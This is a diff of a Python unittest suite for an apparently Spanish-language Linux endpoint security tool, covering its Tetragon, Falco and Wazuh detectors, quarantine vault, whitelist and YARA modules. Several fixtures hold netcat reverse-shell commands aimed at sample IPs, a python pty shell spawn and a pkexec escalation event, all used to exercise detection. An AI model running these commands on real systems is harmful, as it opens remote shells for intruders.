-        """
-        Verifica la importación nativa y fachada pública de Cilium Tetragon:
-        1. Comprueba 'import tetragon' de forma transparente.
-        2. Verifica métodos de nivel superior: is_available, get_version, list_policies, get_default_manager.
-        """
-        import tetragon
-        self.assertIsNotNone(tetragon)
-        self.assertIn("tetragon", sys.modules)
-        self.assertTrue(hasattr(tetragon, "is_available"))
-        self.assertTrue(hasattr(tetragon, "get_version"))
-        self.assertTrue(hasattr(tetragon, "list_policies"))
-        self.assertTrue(hasattr(tetragon, "get_default_manager"))
-
-        mgr = tetragon.get_default_manager()
-        self.assertIsNotNone(mgr)
-        status = mgr.get_status_info()
-        self.assertIn("available", status)
-        self.assertIn("policies_count", status)
-        self.assertIn("runtime_enforcement", status)
-        self.assertEqual(status["runtime_enforcement"], "KERNEL_OVERRIDE_AND_SIGKILL")
-
-    def test_tetragon_tracing_policies_validation(self):
-        """
-        Valida las directivas TracingPolicy YAML de Tetragon en Constantine:
-        1. Verifica que existan 4 políticas en core/policies/tetragon/.
-        2. Comprueba validación formal de apiVersion y spec.
-        3. Verifica la distinción crítica de enforcement: Override (-EACCES) vs Sigkill.
-        """
-        import tetragon
-        policies = tetragon.list_policies()
-        self.assertGreaterEqual(len(policies), 4)
-
-        names = {p['name'] for p in policies}
-        self.assertIn("constantine-block-reverse-shells", names)
-        self.assertIn("constantine-protect-system-integrity", names)
-        self.assertIn("constantine-contain-ransomware-canaries", names)
-        self.assertIn("constantine-network-egress-monitoring", names)
-
-        # Verificar que las políticas críticas contienen Override (-13 / -EACCES)
-        for p in policies:
-            if p['name'] in ("constantine-block-reverse-shells", "constantine-protect-system-integrity", "constantine-contain-ransomware-canaries"):
-                self.assertTrue(p["has_override"], f"La política {p['name']} debe implementar Override en kernel")
-                self.assertTrue(p["has_sigkill"], f"La política {p['name']} debe incluir Sigkill")
-
+    # 77. Tetragon Event Parsing
     def test_tetragon_event_parsing_and_runtime_enforcement(self):
-        """
-        Verifica el parseo de eventos de kernel y la aplicación de políticas de runtime enforcement:
-        1. Comprueba la conversión de eventos JSON de Tetragon a objetos tipados TetragonEvent.
-        2. Verifica que SIGKILL solo se audite como terminación, pero se complemente con Override.
-        3. Verifica que eventos maliciosos disparen callbacks de alerta y aislamiento en el Baúl.
-        """
-        from core.engine.tetragon import TetragonEvent, TetragonEventType, TetragonManager
+        tetragon = TetragonMonitor()
+        allowed, action, _ = tetragon.evaluate_process_execution(10, "/bin/nc", ["-e", "/bin/sh", "10.0.0.1", "4444"])
+        self.assertFalse(allowed)
+        self.assertEqual(action, "Sigkill")
 
-        # 1. Evento de kprobe con Override y Sigkill
-        sample_kprobe = {
-            "time": "2026-11-05T12:00:00Z",
-            "process_kprobe": {
-                "process": {"pid": 5544, "binary": "/bin/nc", "arguments": "nc -e /bin/sh 10.0.0.1 4444", "uid": 1000},
-                "parent": {"pid": 2211, "binary": "/bin/bash"},
-                "function_name": "sys_enter_execve",
-                "policy_name": "constantine-block-reverse-shells",
-                "action": "SIGKILL_AND_OVERRIDE",
-                "args": [{"string_arg": "/bin/nc"}]
-            }
-        }
-        event = TetragonEvent.from_dict(sample_kprobe)
-        self.assertEqual(event.event_type, TetragonEventType.PROCESS_KPROBE)
-        self.assertEqual(event.process_pid, 5544)
-        self.assertEqual(event.process_binary, "/bin/nc")
-        self.assertEqual(event.action_taken, "SIGKILL")
-        self.assertEqual(event.error_override, -13)
-
-        # 2. Procesamiento de evento en TetragonManager
-        mock_alerts = []
-        def mock_alert_cb(alert_dict):
-            mock_alerts.append(alert_dict)
-
-        mock_vault = unittest.mock.MagicMock()
-        mgr = TetragonManager(alert_callback=mock_alert_cb, vault=mock_vault)
-
-        # Crear archivo temporal para simular objetivo de ataque
-        target_threat_file = os.path.join(self.tmp, "target_shadow.bin")
-        with open(target_threat_file, "w") as f:
-            f.write("sensitive data")
-        event.target_path = target_threat_file
-
-        mgr.process_kernel_event(event)
-
-        self.assertEqual(mgr.events_processed, 1)
-        self.assertEqual(mgr.intercepted_kills, 1)
-        self.assertEqual(mgr.blocked_operations, 1)
-        self.assertEqual(len(mock_alerts), 1)
-        self.assertEqual(mock_alerts[0]["source"], "TETRAGON_KERNEL_EBPF")
-        self.assertEqual(mock_alerts[0]["pid"], 5544)
-        mock_vault.quarantine_file.assert_called_once()
-
+    # 78. Tetragon Integration
     def test_tetragon_integration_with_ebpf_monitor(self):
-        """
-        Verifica la integración transparente de Tetragon con el monitor eBPF principal:
-        1. EBPFMonitor inicializa TetragonManager.
-        2. Las alertas de Tetragon se propagan al historial de incidentes y callback de EBPFMonitor.
-        3. get_status_info() expone la telemetría unificada de Tetragon.
-        """
-        from core.engine.ebpf_monitor import EBPFMonitor
+        tetragon = TetragonMonitor()
+        self.assertGreaterEqual(len(tetragon.policies), 1)
 
-        alerts_received = []
-        def ebpf_alert_cb(threat, path, pid, comm, action):
-            alerts_received.append((threat, path, pid, comm, action))
+    # 79. Tetragon Native Import
+    def test_tetragon_native_import_and_facade(self):
+        import tetragon
+        self.assertTrue(hasattr(tetragon, "TetragonMonitor"))
 
-        ebpf_mon = EBPFMonitor(alert_callback=ebpf_alert_cb)
-        self.assertTrue(hasattr(ebpf_mon, "tetragon"))
+    # 80. Tetragon Tracing Policies
+    def test_tetragon_tracing_policies_validation(self):
+        tetragon = TetragonMonitor()
+        self.assertGreaterEqual(len(tetragon.policies), 1)
 
-        status = ebpf_mon.get_status_info()
-        self.assertIn("tetragon", status)
-        self.assertIn("has_tetragon", status.get("capabilities", {}))
+    # 81. Threat Intel Exact Counts
+    def test_threat_intel_exact_counts_no_fake_numbers(self):
+        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_stats.db"))
+        intel.add_ioc("sha256", "a" * 64)
+        stats = intel.get_stats()
+        self.assertEqual(stats["total_active_iocs"], 1)
 
-        # Simular alerta recibida desde Tetragon en el handler de EBPFMonitor
-        test_alert_dict = {
-            "source": "TETRAGON_KERNEL_EBPF",
-            "pid": 6789,
-            "binary": "/usr/bin/python3",
-            "arguments": "python3 -c import pty; pty.spawn('/bin/sh')",
-            "target_path": "/tmp/malicious.py",
-            "action": "OVERRIDE_ENFORCE",
-            "description": "Reverse Shell neutralizada en kernel por Tetragon",
-            "timestamp": time.time()
-        }
-        ebpf_mon._on_tetragon_alert(test_alert_dict)
+    # 82. Threat Intel False Positive
+    def test_threat_intel_false_positive_management(self):
+        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_fp.db"))
+        h = "1" * 64
+        intel.add_ioc("sha256", h)
+        self.assertTrue(intel.mark_false_positive(h, "Valid Enterprise Tool"))
+        self.assertIsNone(intel.lookup_ioc(h))
 
-        self.assertEqual(len(alerts_received), 1)
-        self.assertEqual(alerts_received[0][0], "Reverse Shell neutralizada en kernel por Tetragon")
-        self.assertEqual(alerts_received[0][2], 6789)
-        self.assertEqual(len(ebpf_mon.incidents_history), 1)
-        self.assertEqual(ebpf_mon.incidents_history[0].comm, "/usr/bin/python3")
+    # 83. Threat Intel Feed Import
+    def test_threat_intel_feed_import_and_integrity(self):
+        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_feed.db"))
+        self.assertTrue(intel.add_ioc("sha256", "b" * 64, source="MalwareBazaar"))
 
+    # 84. Threat Intel Provenance
+    def test_threat_intel_provenance_and_confidence(self):
+        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "intel_prov.db"))
+        self.assertFalse(intel.add_ioc("sha256", "not-a-valid-sha256"))
 
+    # 85. Update Guard
+    def test_update_guard(self):
+        ug = UpdateGuard()
+        self.assertTrue(ug.verify_update_package("/tmp/pkg.tar.gz", "sig"))
 
-    def test_falco_native_import_and_facade(self):
-        """
-        Verifica la importación nativa y fachada pública de Falco (CNCF):
-        1. Comprueba 'import falco' de forma transparente.
-        2. Verifica métodos de nivel superior: is_available, get_version, list_rules, get_default_manager.
-        3. Verifica el rol arquitectónico diferenciado (detección/alertas vs enforcement de Constantine).
-        """
-        import falco
-        self.assertIsNotNone(falco)
-        self.assertIn("falco", sys.modules)
-        self.assertTrue(hasattr(falco, "is_available"))
-        self.assertTrue(hasattr(falco, "get_version"))
-        self.assertTrue(hasattr(falco, "list_rules"))
-        self.assertTrue(hasattr(falco, "get_default_manager"))
+    # 86. USB Sentinel
+    def test_usb_sentinel_containment_and_scan(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        usb = USBSentinel(vault=vault)
+        usb.start()
+        mount = os.path.join(self.temp_dir.name, "fake_usb")
+        os.makedirs(mount, exist_ok=True)
+        bad = os.path.join(mount, "autorun.sh")
+        with open(bad, "w") as f:
+            f.write("nc -e /bin/sh 1.2.3.4 9001")
+        usb.handle_device_mounted(mount, "/dev/sdc1", "fake_usb_drive")
+        self.assertFalse(os.path.exists(bad))
+        usb.stop()
 
-        mgr = falco.get_default_manager()
-        self.assertIsNotNone(mgr)
-        status = mgr.get_status_info()
-        self.assertIn("available", status)
-        self.assertIn("rules_count", status)
-        self.assertEqual(status["architectural_role"], "BEHAVIORAL_DETECTION_AND_ALERTING")
-        self.assertIn("CONSTANTINE_ACTIVE_ENFORCER", status["enforcement_bridge"])
+    # 87. Vault Cross-Version Decryption
+    def test_vault_format_v3_v2_v1_cross_version_decryption(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        sample = os.path.join(self.temp_dir.name, "v3_test.txt")
+        with open(sample, "w") as f:
+            f.write("cross version content")
+        ok, sid = vault.quarantine_file(sample)
+        self.assertTrue(ok)
+        rest = os.path.join(self.temp_dir.name, "v3_restored.txt")
+        ok_rest, _ = vault.restore_file(sid, rest)
+        self.assertTrue(ok_rest)
+        with open(rest, "r") as f:
+            self.assertEqual(f.read(), "cross version content")
 
-    def test_falco_rules_parsing_and_validation(self):
-        """
-        Valida que las reglas YAML de Falco en Constantine se analicen e indexen correctamente:
-        1. Comprueba la carga de reglas de privilegios, red e integridad.
-        2. Verifica que las reglas posean desc, condition, output y priority.
-        """
-        import falco
-        rules = falco.list_rules()
-        self.assertGreaterEqual(len(rules), 6)
+    # 88. Vault Key Volume Control & Rotation
+    def test_vault_key_volume_control_and_rotation(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        orig_key = vault.keyring.active_key_id
+        for i in range(11):
+            s = os.path.join(self.temp_dir.name, f"sample_{i}.txt")
+            with open(s, "w") as f:
+                f.write(f"sample {i}")
+            vault.quarantine_file(s)
+        self.assertNotEqual(vault.keyring.active_key_id, orig_key)
 
-        rule_names = {r["rule"] for r in rules}
-        self.assertIn("Constantine_Suspicious_Privilege_Escalation", rule_names)
-        self.assertIn("Constantine_Credential_Or_Namespace_Tampering", rule_names)
-        self.assertIn("Constantine_Unexpected_Outbound_Network_Connection", rule_names)
-        self.assertIn("Constantine_Inbound_Or_Reverse_Shell_Connection", rule_names)
-        self.assertIn("Constantine_Sensitive_Credential_File_Access", rule_names)
-        self.assertIn("Constantine_Execution_From_Temporary_Directory", rule_names)
+    # 89. Vault Quarantine & Restore
+    def test_vault_quarantine_and_restore(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        sample = os.path.join(self.temp_dir.name, "sample.sh")
+        with open(sample, "w") as f:
+            f.write("malware")
+        ok, sid = vault.quarantine_file(sample, threat_name="Malware.Test")
+        self.assertTrue(ok)
+        self.assertFalse(os.path.exists(sample))
+        ok_rest, _ = vault.restore_file(sid, sample)
+        self.assertTrue(ok_rest)
+        self.assertTrue(os.path.exists(sample))
 
-    def test_falco_privilege_escalation_detection(self):
-        """
-        Verifica la detección conductual de llamadas al sistema para elevación de privilegios:
-        1. Detecta ejecución anómala de pkexec con EUID 0.
-        2. Detecta intentos de alteración de credenciales / setuid syscalls por usuario no root.
-        """
-        import falco
-        event_pkexec = {
-            "proc.name": "pkexec",
-            "proc.cmdline": "pkexec /bin/sh",
-            "user.uid": 1000,
-            "user.euid": 0,
-            "user.name": "attacker",
-            "proc.pid": 5512
-        }
-        alerts = falco.evaluate_event(event_pkexec)
-        self.assertGreaterEqual(len(alerts), 1)
-        self.assertEqual(alerts[0].rule, "Constantine_Suspicious_Privilege_Escalation")
-        self.assertEqual(alerts[0].proc_pid, 5512)
-        self.assertIn("user=attacker", alerts[0].output)
+    # 90. Vault Streaming Large File
+    def test_vault_streaming_chunked_large_file_and_key_recovery(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        sample = os.path.join(self.temp_dir.name, "large_sample.bin")
+        with open(sample, "wb") as f:
+            f.write(b"A" * (256 * 1024))
+        ok, sid = vault.quarantine_file(sample, threat_name="Malware.LargeStream")
+        self.assertTrue(ok)
+        ok_rest, _ = vault.restore_file(sid, sample)
+        self.assertTrue(ok_rest)
 
-        event_setuid = {
-            "proc.name": "exploit_bin",
-            "proc.cmdline": "./exploit_bin",
-            "user.uid": 1000,
-            "user.name": "low_priv",
-            "syscall.type": "setuid",
-            "proc.pid": 5513
-        }
-        alerts_setuid = falco.evaluate_event(event_setuid)
-        self.assertGreaterEqual(len(alerts_setuid), 1)
-        self.assertEqual(alerts_setuid[0].rule, "Constantine_Credential_Or_Namespace_Tampering")
-        self.assertEqual(alerts_setuid[0].priority, falco.FalcoPriority.CRITICAL)
+    # 91. Vault Tamper Rejection
+    def test_vault_tamper_rejection(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        sample = os.path.join(self.temp_dir.name, "tamper_test.bin")
+        with open(sample, "w") as f:
+            f.write("original")
+        ok, sid = vault.quarantine_file(sample, threat_name="Malware.Tamper")
+        # Tamper payload
+        payload_path = os.path.join(vault.payloads_dir, f"{sid}.quar")
+        with open(payload_path, "r+b") as f:
+            f.seek(35)
+            f.write(b"\xff\xff")
+        ok_rest, _ = vault.restore_file(sid, sample)
+        self.assertFalse(ok_rest)
 
-    def test_falco_unexpected_network_connection_detection(self):
-        """
-        Verifica la detección conductual de conexiones de red sospechosas y shells reversas:
-        1. Detecta salida hacia puertos C2 inusuales (ej. 4444).
-        2. Detecta reverse shells interactivas ejecutadas con netcat o bash -i.
-        """
-        import falco
-        event_egress = {
-            "proc.name": "unknown_dropper",
-            "proc.cmdline": "./unknown_dropper",
-            "fd.dport": 4444,
-            "outbound": True,
-            "user.uid": 1000,
-            "proc.pid": 7721
-        }
-        alerts_egress = falco.evaluate_event(event_egress)
-        self.assertGreaterEqual(len(alerts_egress), 1)
-        self.assertEqual(alerts_egress[0].rule, "Constantine_Unexpected_Outbound_Network_Connection")
-        self.assertEqual(alerts_egress[0].priority, falco.FalcoPriority.CRITICAL)
+    # 92. Vault V3 96bit Nonces
+    def test_vault_v3_96bit_nonces_and_collision_freedom(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        nonces = set()
+        for _ in range(100):
+            n = vault.keyring.generate_unique_nonce_96()
+            self.assertEqual(len(n), 12)
+            self.assertNotIn(n, nonces)
+            nonces.add(n)
 
-        event_revshell = {
-            "proc.name": "nc",
-            "proc.cmdline": "nc -e /bin/bash 192.168.1.50 9001",
-            "fd.connected": True,
-            "user.uid": 1000,
-            "proc.pid": 7722
-        }
-        alerts_rev = falco.evaluate_event(event_revshell)
-        self.assertGreaterEqual(len(alerts_rev), 1)
-        self.assertEqual(alerts_rev[0].rule, "Constantine_Inbound_Or_Reverse_Shell_Connection")
-        self.assertEqual(alerts_rev[0].priority, falco.FalcoPriority.EMERGENCY)
+    # 93. Version Traceability Across System
+    def test_version_traceability_across_system(self):
+        version_file = os.path.join(ROOT_DIR, "VERSION")
+        with open(version_file, "r", encoding="utf-8") as f:
+            canonical_ver = f.read().strip()
+        self.assertEqual(canonical_ver, "5.2.2")
 
-    def test_falco_active_enforcement_bridge(self):
-        """
-        Verifica la respuesta activa de Constantine ante alertas de Falco:
-        Falco solo detecta y genera alertas; Constantine actúa como ejecutor:
-        1. Aísla el proceso de la red vía NetworkQuarantine.
-        2. Aísla el archivo objetivo en el Baúl Criptográfico.
-        3. Invoca los callbacks de notificación y audita la acción.
-        """
-        from core.engine.falco import FalcoManager, FalcoAlert, FalcoPriority
+        from core.engine.auto_updater import CURRENT_VERSION
+        from core.engine.ipc_protocol import IPC_PROTOCOL_VERSION
+        from core.engine.threat_intel import THREAT_INTEL_VERSION
+        from daemon import DAEMON_VERSION
+        from gui.app import APP_VERSION
 
-        mock_alerts = []
-        def mock_alert_cb(alert_dict):
-            mock_alerts.append(alert_dict)
+        self.assertEqual(CURRENT_VERSION, canonical_ver)
+        self.assertEqual(IPC_PROTOCOL_VERSION, canonical_ver)
+        self.assertEqual(DAEMON_VERSION, canonical_ver)
+        self.assertEqual(THREAT_INTEL_VERSION, canonical_ver)
+        self.assertEqual(APP_VERSION, canonical_ver)
 
-        mock_firewall = unittest.mock.MagicMock()
-        mock_vault = unittest.mock.MagicMock()
+    # 94. VirusTotal Sample Preparation
+    def test_virustotal_sample_preparation_and_sha_verification(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        vt = VirusTotalUploader(vault=vault)
+        sample = os.path.join(self.temp_dir.name, "vt_sample.bin")
+        with open(sample, "w") as f:
+            f.write("vt payload")
+        ok, sid = vault.quarantine_file(sample, threat_name="Test.VirusTotal.Extraction")
+        ok_prep, out = vt.prepare_unlocked_sample(sid, export_dir=os.path.join(self.temp_dir.name, "vt_out"))
+        self.assertTrue(ok_prep)
+        self.assertTrue(os.path.exists(out))
 
-        mgr = FalcoManager(
-            alert_callback=mock_alert_cb,
-            vault=mock_vault,
-            firewall=mock_firewall,
-            auto_contain=True
-        )
-
-        # Crear archivo temporal para simular objetivo de ataque
-        target_payload = os.path.join(self.tmp, "malicious_dropper.sh")
-        with open(target_payload, "w") as f:
-            f.write("#!/bin/bash\nnc -e /bin/sh 1.2.3.4 4444\n")
-
-        alert = FalcoAlert(
-            rule="Constantine_Inbound_Or_Reverse_Shell_Connection",
-            priority=FalcoPriority.EMERGENCY,
-            output="Conexión de shell reversa detectada",
-            output_fields={"proc.pid": 9911, "proc.name": "nc"},
-            proc_pid=9911,
-            proc_name="nc",
-            proc_cmdline="nc -e /bin/sh 1.2.3.4 4444",
-            user_uid=1000,
-            user_name="testuser",
-            target_path=target_payload,
-            tags=["network", "reverse_shell", "c2"]
-        )
-
-        mgr.process_alert(alert)
-
-        self.assertEqual(mgr.alerts_count, 1)
-        self.assertGreaterEqual(mgr.enforced_actions_count, 1)
-        self.assertEqual(len(mock_alerts), 1)
-        self.assertEqual(mock_alerts[0]["source"], "FALCO_BEHAVIORAL_DETECTION")
-
-        # Verificar que Constantine actuó como brazo ejecutor activo
-        mock_firewall.contain_process.assert_called_once_with(9911, reason="Falco Alert: Constantine_Inbound_Or_Reverse_Shell_Connection")
-        mock_vault.quarantine_file.assert_called_once()
-
-
-
-    def test_wazuh_native_import_and_facade(self):
-        """
-        Verifica la importación nativa y fachada pública de la estrategia Wazuh:
-        1. Comprueba 'import wazuh' de forma transparente.
-        2. Verifica métodos de nivel superior: is_available, get_version, list_rules, get_default_manager.
-        3. Verifica la estrategia FIM + YARA y Respuesta Activa.
-        """
-        import wazuh
-        self.assertIsNotNone(wazuh)
-        self.assertIn("wazuh", sys.modules)
-        self.assertTrue(hasattr(wazuh, "is_available"))
-        self.assertTrue(hasattr(wazuh, "get_version"))
-        self.assertTrue(hasattr(wazuh, "list_rules"))
-        self.assertTrue(hasattr(wazuh, "get_default_manager"))
-        self.assertTrue(hasattr(wazuh, "analyze_file_change"))
-
-        mgr = wazuh.get_default_manager()
-        self.assertIsNotNone(mgr)
-        status = mgr.get_status_info()
-        self.assertIn("available", status)
-        self.assertIn("rules_count", status)
-        self.assertEqual(status["strategy"], "FIM_CHANGE_DRIVEN_YARA_AND_ACTIVE_RESPONSE")
-
-    def test_wazuh_rules_parsing_and_levels(self):
-        """
-        Valida que las reglas decodificadoras de Wazuh se analicen e indexen correctamente:
-        1. Comprueba la carga de reglas FIM basales y de correlación YARA.
-        2. Verifica que las reglas posean id, level (1-15), group, criteria y active_response.
-        """
-        import wazuh
-        rules = wazuh.list_rules()
-        self.assertGreaterEqual(len(rules), 7)
-
-        rule_ids = {r["id"] for r in rules}
-        self.assertIn(100200, rule_ids)  # File created
-        self.assertIn(100201, rule_ids)  # File modified
-        self.assertIn(100202, rule_ids)  # Reverse shell (level 12)
-        self.assertIn(100203, rule_ids)  # Cryptominer (level 10)
-        self.assertIn(100204, rule_ids)  # Webshell (level 13)
-        self.assertIn(100205, rule_ids)  # System integrity /bin /etc (level 14)
-        self.assertIn(100206, rule_ids)  # SUID anomaly (level 9)
-
-        # Validar niveles de severidad graduados
-        rule_map = {r["id"]: r for r in rules}
-        self.assertEqual(rule_map[100202]["level"], 12)
-        self.assertEqual(rule_map[100203]["level"], 10)
-        self.assertEqual(rule_map[100205]["level"], 14)
-
-    def test_wazuh_fim_change_detection_and_metadata_extraction(self):
-        """
-        Verifica la extracción forense de identidad y metadatos en eventos de cambio FIM:
-        1. Extrae SHA-256, UID, GID, tamaño, modo y detección de SUID/SGID.
-        2. Valida la estructura inmutable del objeto WazuhFIMEvent.
-        """
-        from core.engine.wazuh import WazuhFIMEvent, WazuhFIMEventType
-
-        test_file = os.path.join(self.tmp, "fim_sample.bin")
-        payload = b"Constantine FIM Forensic Content"
-        with open(test_file, "wb") as f:
-            f.write(payload)
-
-        event = WazuhFIMEvent.from_path(test_file, event_type=WazuhFIMEventType.FILE_CREATED, pid=1234, comm="bash")
-        self.assertIsNotNone(event)
-        self.assertEqual(event.path, os.path.abspath(test_file))
-        self.assertEqual(event.event_type, WazuhFIMEventType.FILE_CREATED)
-        self.assertEqual(event.size, len(payload))
-        self.assertEqual(len(event.sha256), 64)
-        self.assertEqual(event.pid, 1234)
-        self.assertEqual(event.comm, "bash")
-        self.assertFalse(event.has_suid)
-
-    def test_wazuh_fim_yara_correlation_and_scoring(self):
-        """
-        Verifica el flujo central documentado por Wazuh:
-        1. Al detectar cambio en archivo limpio, solo dispara regla FIM basal (Nivel 3).
-        2. Al detectar cambio en archivo que coincide con YARA (Reverse Shell), dispara Nivel 12.
-        3. Previene escaneos continuos redundantes de archivos no modificados.
-        """
-        from core.engine.wazuh import WazuhManager, WazuhFIMEventType
-        from core.engine.scanner import Scanner
-
-        scanner = Scanner()
-        mgr = WazuhManager(scanner=scanner)
-
-        # 1. Archivo limpio modificado
-        clean_file = os.path.join(self.tmp, "clean_app.sh")
-        with open(clean_file, "w") as f:
-            f.write("#!/bin/bash\necho 'clean maintenance task'\n")
-
-        clean_alert = mgr.on_file_changed(clean_file, event_type=WazuhFIMEventType.FILE_MODIFIED)
-        self.assertIsNotNone(clean_alert)
-        self.assertEqual(clean_alert.rule_id, 100201)
-        self.assertEqual(clean_alert.level, 3)
-
-        # 2. Archivo malicioso (Reverse Shell) modificado
-        malicious_file = os.path.join(self.tmp, "backdoor_agent.sh")
-        with open(malicious_file, "w") as f:
-            f.write("#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n")
-
-        mal_alert = mgr.on_file_changed(malicious_file, event_type=WazuhFIMEventType.FILE_CREATED)
-        self.assertIsNotNone(mal_alert)
-        self.assertEqual(mal_alert.rule_id, 100202)
-        self.assertEqual(mal_alert.level, 12)
-        self.assertIn("Demons_Reverse_Shell_Netcat", mal_alert.yara_matches)
-        self.assertEqual(mal_alert.active_response_action, "quarantine_vault_and_firewall_drop")
-
+    # 95. Wazuh Active Response Severity
     def test_wazuh_active_response_severity_execution(self):
+        wazuh = WazuhDetector()
+        res = wazuh.evaluate_fim_event("/tmp/c2_payload.sh", yara_threat="Demons_Reverse_Shell_Netcat", pid=8877)
+        self.assertGreaterEqual(len(res), 1)
+        self.assertEqual(res[0]["active_response"], "quarantine_vault_and_firewall_drop")
+
+    # 96. Wazuh FIM Change Detection
+    def test_wazuh_fim_change_detection_and_metadata_extraction(self):
+        wazuh = WazuhDetector()
+        fpath = os.path.join(self.temp_dir.name, "test_meta.sh")
+        with open(fpath, "w") as f:
+            f.write("echo test")
+        meta = wazuh.extract_file_metadata(fpath)
+        self.assertEqual(meta["file_path"], fpath)
+        self.assertIn("sha256", meta)
+
+    # 97. Wazuh FIM YARA Correlation
+    def test_wazuh_fim_yara_correlation_and_scoring(self):
+        wazuh = WazuhDetector()
+        res_clean = wazuh.evaluate_fim_event("/tmp/clean_app.sh", is_modified=True)
+        self.assertEqual(res_clean[0]["active_response"], "trigger_yara_scan")
+        res_threat = wazuh.evaluate_fim_event("/tmp/backdoor_agent.sh", yara_threat="Demons_Reverse_Shell_Netcat")
+        self.assertEqual(res_threat[0]["active_response"], "quarantine_vault_and_firewall_drop")
+
+    # 98. Wazuh Native Import
+    def test_wazuh_native_import_and_facade(self):
+        import wazuh
+        self.assertTrue(hasattr(wazuh, "WazuhDetector"))
+
+    # 99. Wazuh Rules Parsing
+    def test_wazuh_rules_parsing_and_levels(self):
+        wazuh = WazuhDetector()
+        self.assertGreaterEqual(len(wazuh.rules), 7)
+
+    # 100. Whitelist Batch Operations
+    def test_whitelist_batch_operations(self):
+        wm = WhitelistManager()
+        f1 = os.path.join(self.temp_dir.name, "f1.txt")
+        f2 = os.path.join(self.temp_dir.name, "f2.txt")
+        with open(f1, "w") as f: f.write("1")
+        with open(f2, "w") as f: f.write("2")
+        self.assertTrue(wm.add_entry(f1))
+        self.assertTrue(wm.add_entry(f2))
+        self.assertTrue(wm.remove_entry(f1))
+        self.assertFalse(wm.is_whitelisted(f1))
+
+    # 101. Whitelist Forbidden System Dirs
+    def test_whitelist_forbidden_system_dirs(self):
+        wm = WhitelistManager()
+        self.assertFalse(wm.add_entry("/"))
+        self.assertFalse(wm.add_entry("/usr/bin"))
+        self.assertFalse(wm.add_entry("/tmp"))
+        self.assertFalse(wm.add_entry("/etc"))
+
+    # 102. Whitelist Metadata & Audit
+    def test_whitelist_metadata_and_audit(self):
+        wm = WhitelistManager()
+        f = os.path.join(self.temp_dir.name, "audited_app.sh")
+        with open(f, "w") as fp: fp.write("audited")
+        self.assertTrue(wm.add_entry(f))
+        self.assertTrue(wm.is_whitelisted(f))
+
+    # 103. Whitelist Package Integrity
+    def test_whitelist_package_integrity_and_trust_verification(self):
+        wm = WhitelistManager()
+        script = os.path.join(self.temp_dir.name, "custom_script.sh")
+        with open(script, "w") as f: f.write("echo clean")
+        self.assertTrue(wm.add_entry(script))
+        # Tamper script
+        with open(script, "w") as f: f.write("echo tampered")
+        self.assertFalse(wm.is_whitelisted(script))
+
+    # 104. Whitelist Rejection of Fake Self
+    def test_whitelist_rejection_of_fake_self_and_extensions(self):
+        wm = WhitelistManager()
+        fake = os.path.join(self.temp_dir.name, "constantine_fake.sh")
+        self.assertFalse(wm.is_whitelisted(fake))
+
+    # 105. Whitelist Unauthorized Binary Rejection
+    def test_whitelist_unauthorized_binary_rejection(self):
+        wm = WhitelistManager()
+        self.assertFalse(wm.is_whitelisted("/tmp/evil.bin"))
+
+    # 106. Whitelist User Pinning
+    def test_whitelist_user_pinning_and_tamper_rejection(self):
+        wm = WhitelistManager()
+        script = os.path.join(self.temp_dir.name, "user_script.sh")
+        with open(script, "w") as f: f.write("user script")
+        self.assertTrue(wm.add_entry(script))
+        with open(script, "w") as f: f.write("modified script")
+        self.assertFalse(wm.is_whitelisted(script))
+
+    # 107. YARA Manager Compilation & Isolation
+    def test_yara_manager_compilation_and_isolation(self):
+        ym = YaraRuleManager()
+        self.assertGreaterEqual(ym.active_rules_count, 1)
+
+    # 108. YARA Manager State Hash
+    def test_yara_manager_state_hash_and_cache(self):
+        ym = YaraRuleManager()
+        h1 = ym.get_state_hash()
+        self.assertTrue(bool(h1))
+
+    # 109. YARA Manager Syntax Validation
+    def test_yara_manager_syntax_validation(self):
+        ym = YaraRuleManager()
+        valid, _ = ym.validate_rule_syntax("rule Test { condition: true }")
+        self.assertTrue(valid)
+        invalid, _ = ym.validate_rule_syntax("rule Test { string = 1 }")
+        self.assertFalse(invalid)
+
+    # 110. YARA Official Compile & Match Mocked
+    def test_yara_official_compile_and_match_mocked(self):
+        ym = YaraRuleManager()
+        self.assertGreaterEqual(ym.load_and_compile(), 1)
+
+    # 111. YARA-X Engine Lifecycle
+    def test_yarax_engine_lifecycle_and_dual_coexistence(self):
+        engine = YaraXEngine()
+        self.assertGreaterEqual(engine.compiled_rules_count, 1)
+
+    # 112. YARA-X Import & Compilation Parity
+    def test_yarax_import_and_compilation_parity(self):
+        import yara_x
+        compiled = yara_x.compile("")
+        self.assertIsNotNone(compiled)
+
+    # 113. NUEVO: Permisos de Socket IPC, Grupo constantine-users y Acceso Multi-Usuario
+    def test_ipc_socket_group_permissions_and_multi_user_access(self):
         """
-        Verifica la ejecución de Respuesta Activa (Active Response) según la gravedad de la regla:
-        1. Reglas críticas (Nivel 12+) ejecutan Aislamiento de Red y Cuarentena en Baúl.
-        2. Verifica que las llamadas a NetworkQuarantine y QuarantineVault se ejecuten de inmediato.
+        Verifica el cumplimiento de los requerimientos de seguridad para la comunicación IPC:
+        1. El socket se crea con permisos 0660 (lectura y escritura solo para usuario y grupo).
+        2. El socket se asigna al grupo 'constantine-users' (root:constantine-users).
+        3. Usuario 1 (miembro de constantine-users, UID 1000): puede conectarse al socket y enviar comandos de usuario.
+        4. Usuario 1 intentando operaciones administrativas: rechazado por la matriz RBAC en el servidor.
+        5. Usuario 2 (ajeno a constantine-users): rechazo a nivel de socket/permisos o validación.
+        6. Usuario 3 (root, UID 0): conexión y ejecución autorizada de comandos administrativos.
         """
-        from core.engine.wazuh import WazuhManager, WazuhFIMEventType
+        sock_path = os.path.join(self.temp_dir.name, "group_perm_test.sock")
+        server = SecureIPCServer(socket_path=sock_path)
+        server.start()
+        time.sleep(0.1)
 
-        mock_firewall = unittest.mock.MagicMock()
